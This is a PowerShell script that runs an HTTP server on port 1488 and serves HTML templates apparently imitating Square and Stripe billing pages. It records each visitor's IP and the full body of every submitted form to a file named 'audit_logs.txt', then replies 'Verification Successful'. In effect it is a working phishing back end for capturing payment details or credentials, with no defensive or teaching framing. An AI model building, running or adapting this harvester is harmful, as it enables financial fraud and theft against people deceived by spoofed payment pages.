param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("square","stripe")]
    [string]$template
)

# Map template choice to actual file path
switch ($template) {
    "square" { $templateFile = "templates\square_billing.html" }
    "stripe" { $templateFile = "templates\stripe_billing.html" }
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:1488/")
$listener.Start()
Write-Host "[*] Starting server on port 1488 using template: $templateFile"

while ($listener.IsListening) {
    $context = $listener.GetContext()
    $request = $context.Request
    $response = $context.Response

    # Capture metadata
    $clientIP = $request.RemoteEndPoint.Address.IPAddressToString
    $logEntry = "[$(Get-Date)] IP: $clientIP | Method: $($request.HttpMethod) | Path: $($request.Url.AbsolutePath)"

    # Handle POST data
    if ($request.HttpMethod -eq "POST") {
        $reader = New-Object System.IO.StreamReader($request.InputStream)
        $body = $reader.ReadToEnd()
        $logEntry += " | Data: $body"
    }

    # Log to file
    $logEntry | Out-File -FilePath "audit_logs.txt" -Append
    Write-Host "[!] $logEntry"

    # Serve selected HTML template on root request
    if ($request.Url.AbsolutePath -eq "/") {
        $htmlContent = Get-Content -Path $templateFile -Raw
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($htmlContent)
    } else {
        $buffer = [System.Text.Encoding]::UTF8.GetBytes("Verification Successful")
    }

    $response.ContentLength64 = $buffer.Length
    $response.OutputStream.Write($buffer, 0, $buffer.Length)
    $response.Close()
}
